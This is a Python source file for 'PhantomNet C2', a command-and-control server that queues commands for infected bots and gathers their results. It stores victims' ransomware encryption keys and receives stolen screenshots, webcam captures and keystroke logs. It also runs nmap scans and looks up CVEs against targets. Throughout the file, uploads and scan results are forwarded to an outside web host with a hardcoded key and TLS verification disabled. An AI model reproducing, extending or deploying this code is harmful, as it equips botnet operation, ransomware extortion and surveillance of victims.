from pyfiglet import Figlet, FigletFont
from colorama import Fore, init
import random

init(autoreset=True)

fonts = FigletFont.getFonts()
random_font = random.choice(fonts)
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE]
random_color = random.choice(colors)

fig = Figlet(font=random_font)
print(random_color + fig.renderText('PhantomNet C2'))
print(Fore.YELLOW + "=" * 60)
print(Fore.GREEN + " Adaptive Command & Control Server for Advanced Operations ")
print(Fore.YELLOW + "=" * 60)

from fastapi import FastAPI, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import os
import subprocess
import socket
import time
import threading
import smtplib
from email.message import EmailMessage
import requests

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

commands = {}
results = {}
victim_keys = {}
encryption_flags = {}
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)
KEY_DIR = os.path.join(UPLOAD_DIR, "KEY")
OFILE_DIR = os.path.join(UPLOAD_DIR, "O File")
ENCFILE_DIR = os.path.join(UPLOAD_DIR, "Enc File")
os.makedirs(KEY_DIR, exist_ok=True)
os.makedirs(OFILE_DIR, exist_ok=True)
os.makedirs(ENCFILE_DIR, exist_ok=True)

@app.post("/register")
async def register_bot(data: dict):
    bot_id = data.get("bot_id")
    print(f"[+] Bot registered: {bot_id}")
    return {"status": "registered"}

@app.post("/send_command")
async def send_command(data: dict):
    bot_id = data.get("bot_id")
    command = data.get("command")
    if bot_id:
        commands[bot_id] = command
        return {"status": "command_sent"}
    return {"status": "error", "message": "Missing bot_id"}

@app.get("/get_command/{bot_id}")
async def get_command(bot_id: str):
    command = commands.get(bot_id)
    if command:
        del commands[bot_id]
    return {"command": command}

from fastapi.responses import FileResponse

@app.get("/files/{filename}")
async def get_file(filename: str):
    file_path = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(file_path):
        return FileResponse(file_path, filename=filename)

    key_path = os.path.join(KEY_DIR, filename)
    if os.path.exists(key_path):
        return FileResponse(key_path, filename=filename)

    return {"error": "File not found in UPLOAD or KEY folder"}

@app.post("/send_result")
async def send_result(data: dict):
    bot_id = data.get("bot_id")
    command = data.get("command")
    result = data.get("result")
    if bot_id not in results:
        results[bot_id] = []
    results[bot_id].append((command, result))
    print(f"[✓] Result from {bot_id}: {result}")
    return {"status": "ok"}

@app.get("/get_result/{bot_id}")
async def get_result(bot_id: str):
    if bot_id in results and results[bot_id]:
        _, last_result = results[bot_id][-1]
        return {"result": last_result}
    return {"result": ""}

@app.post("/upload_file/")
async def upload_file(file: UploadFile = File(...), folder: str = Form(default="")):
    import time, requests
    from pathlib import Path

    try:
        # اختيار المجلد الهدف
        folder_map = {
            "KEY": KEY_DIR,
            "O File": OFILE_DIR,
            "Enc File": ENCFILE_DIR
        }
        target_dir = folder_map.get(folder.strip(), UPLOAD_DIR)
        os.makedirs(target_dir, exist_ok=True)

        # حفظ الملف
        filename = file.filename
        file_path = os.path.join(target_dir, filename)
        with open(file_path, "wb") as f:
            f.write(await file.read())

        print(f"[+] Uploaded to {folder or 'root'}: {filename}")

        # إعادة رفعه للداشبورد
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                data = {
                    "key": "oMAR_aSSOLI",
                    "name": f"{int(time.time())}_{filename}",
                    "description": get_file_description(filename)
                }
                response = requests.post(
                    "https://gray-cassowary-688759.hostingersite.com/api/files/upload",
                    data=data,
                    files=files,
                    verify=False
                )

            if response.status_code == 201:
                print("[✓] File re-uploaded to remote DB successfully.")
                return {"status": "uploaded", "filename": filename, "remote": "success"}
            else:
                print(f"[!] DB upload failed. Status: {response.status_code}")
                return {"status": "uploaded", "filename": filename, "remote": "failed"}

        except Exception as e:
            print(f"[!] Error re-uploading file: {e}")
            return {"status": "uploaded", "filename": filename, "remote": "error"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/scan_network")
async def scan_network():
    print("Scanning Network..")
    result_file = f"scan_{time.strftime('%Y%m%d-%H%M%S')}.csv"
    cmd = f"nmap -sS -T4 -p 1-1000 -oG - 192.168.0.0/24 | grep 'Ports:' > {result_file}"
    subprocess.call(cmd, shell=True)
    print(f"[✓] Result : {result_file} Scanned ")
    try:
        with open(result_file, "rb") as f:
            files = {"file": f}
            data = {
                "key": "oMAR_aSSOLI",
                "name": result_file,
                "description": "Nmap network scan result"
            }
            response = requests.post(
                "https://gray-cassowary-688759.hostingersite.com/api/files/upload",
                data=data,
                files=files,
                verify=False
            )

        if response.status_code == 201:
            print("[✓] File uploaded to database successfully.")
        else:
            print(f"[!] Upload failed with status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Error uploading file: {e}")
    return {"status": "scanned", "file": result_file}


def run_server_vuln_scan(target_ip):
    import platform
    import socket
    import os
    import csv
    import time
    import nmap
    import requests

    def scan_ports(ip):
        nm = nmap.PortScanner()
        nm.scan(hosts=ip, arguments='-sV -T4')
        results = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                for port in nm[host][proto]:
                    s = nm[host][proto][port]
                    results.append({
                        "port": port,
                        "product": s.get("product", ""),
                        "version": s.get("version", ""),
                        "service": s.get("name", "")
                    })
        return results

    def search_cve(vendor, product):
        try:
            if not vendor or not product:
                return "Skipped: Empty vendor or product"

            from bs4 import BeautifulSoup
            import re

            url = f"https://cve.circl.lu/search?vendor={vendor}&product={vendor}&vendor_vuln="
            r = requests.get(url, timeout=10)
            if r.status_code != 200:
                return f"[!] HTTP error {r.status_code} for {url}"

            soup = BeautifulSoup(r.text, "lxml")
            cards = soup.select("div.card")

            if not cards:
                return f"No CVEs found for {vendor} {product}"


            safe_vendor = re.sub(r'\W+', '_', vendor.lower())
            safe_product = re.sub(r'\W+', '_', product.lower())
            filename = f"cve_{safe_vendor}_{safe_product}.txt"
            filepath = os.path.join("uploads", filename)
            os.makedirs("uploads", exist_ok=True)

            with open(filepath, "w", encoding="utf-8") as f:
                f.write(f"CVE Results for {vendor} {product}\n")
                f.write("="*60 + "\n\n")
                for card in cards:
                    cve_id_tag = card.select_one("h5.card-title")
                    cve_summary_tag = card.select_one("p.card-text")
                    references_tag = card.select_one("a[href^=http]")

                    if not cve_id_tag or not cve_summary_tag:
                        continue

                    cve_id = cve_id_tag.text.strip()
                    summary = cve_summary_tag.text.strip()
                    exploit = references_tag['href'] if references_tag else "N/A"

                    f.write(f"ID: {cve_id}\n")
                    f.write(f"Summary: {summary}\n")
                    f.write(f"Exploit/Ref: {exploit}\n")
                    f.write("-" * 40 + "\n")
            try:
                with open(filepath, "rb") as f:
                    files = {"file": f}
                    data = {
                        "key": "oMAR_aSSOLI",
                        "name": filename,
                        "description": f"CVE list for {vendor} {product}"
                    }
                    response = requests.post(
                        "https://gray-cassowary-688759.hostingersite.com/api/files/upload",
                        data=data,
                        files=files,
                        verify=False
                    )
                if response.status_code == 201:
                    print(f"[✓] CVE file uploaded: {filename}")
                else:
                    print(f"[!] CVE file upload failed. Status: {response.status_code}")
            except Exception as e:
                print(f"[!] Error uploading CVE file: {e}")

            return f"[✓] Saved and uploaded CVE results: {filename}"

        except Exception as e:
            return f"[!] Failed to fetch or save CVE data: {e}"

            
            
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    filename = f"vulnscan_{target_ip.replace('.', '_')}_{timestamp}.csv"
    filepath = os.path.join("uploads", filename)
    os.makedirs("uploads", exist_ok=True)
    
    services = scan_ports(target_ip)
    rows = []

    for s in services:
        product_string = s["product"].strip()
        if not product_string:
            vendor, product = "", ""
        else:
            parts = product_string.split()
            vendor = parts[0].lower() if len(parts) > 0 else ""
            product = parts[1].lower() if len(parts) > 1 else parts[0].lower()

        search_msg = search_cve(vendor, product)
        rows.append([
            s["port"], vendor, product, s["version"], "-", "Saved to file", search_msg
        ])


    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([f"Target: {target_ip} - Time: {timestamp}"])
        writer.writerow([])
        writer.writerow(["Port", "Vendor", "Product", "Version", "CVE ID", "Summary", "Exploit Reference"])
        writer.writerows(rows)

        try:
            with open(filepath, "rb") as f:
                files = {"file": f}
                data = {
                    "key": "oMAR_aSSOLI",
                    "name": filename,
                    "description": f"Vuln scan report for {target_ip}"
                }
                response = requests.post(
                    "https://gray-cassowary-688759.hostingersite.com/api/files/upload",
                    data=data,
                    files=files,
                    verify=False
                )
            if response.status_code == 201:
                print("[✓] Vuln scan report uploaded to dashboard.")
            else:
                print(f"[!] Upload failed. Status code: {response.status_code}")
        except Exception as e:
            print(f"[!] Error uploading vuln scan report: {e}")

    return {
        "ip": target_ip,
        "csv_report": filename,
        "vuln_count": len(rows)
    }

@app.get("/vuln_scan/{ip}")
def vuln_scan_api(ip: str):
    result = run_server_vuln_scan(ip)
    return result
    
@app.post("/submit_key")
async def submit_key(data: dict):
    device_id = data.get("device_id")
    encrypted_aes_key = data.get("encrypted_aes_key")
    bot_pub_key = data.get("bot_public_key") 

    victim_keys[device_id] = {
        "encrypted_aes_key": encrypted_aes_key,
        "bot_public_key": bot_pub_key 
    }

    encryption_flags[device_id] = False
    return {"status": "key received"}

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# المفتاح الخاص بالسيرفر
server_private_key = ec.generate_private_key(ec.SECP384R1())

def get_shared_key_for_victim(victim_id):
    if victim_id not in victim_keys:
        raise ValueError("Victim not registered")

    bot_pub_pem = victim_keys[victim_id]["bot_public_key"]
    bot_pub_key = serialization.load_pem_public_key(base64.b64decode(bot_pub_pem))

    shared_key = server_private_key.exchange(ec.ECDH(), bot_pub_key)

    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'handshake data'
    ).derive(shared_key)

    return derived_key


from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

@app.get("/pubkey")
def get_server_public_key():
    pub_bytes = server_private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return {"public_key": base64.b64encode(pub_bytes).decode()}

def get_file_description(filename: str) -> str:
    name = filename.lower()
    if "screenshot" in name:
        return "Screenshot from victim"
    elif "webcam" in name:
        return "Webcam capture from victim"
    elif "keylog" in name:
        return "Keystroke log"
    elif "sysinfo" in name:
        return "System info report"
    else:
        return "Uploaded from PhantomNET C2"

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5000,
                ssl_certfile="cert.pem", ssl_keyfile="key.pem")
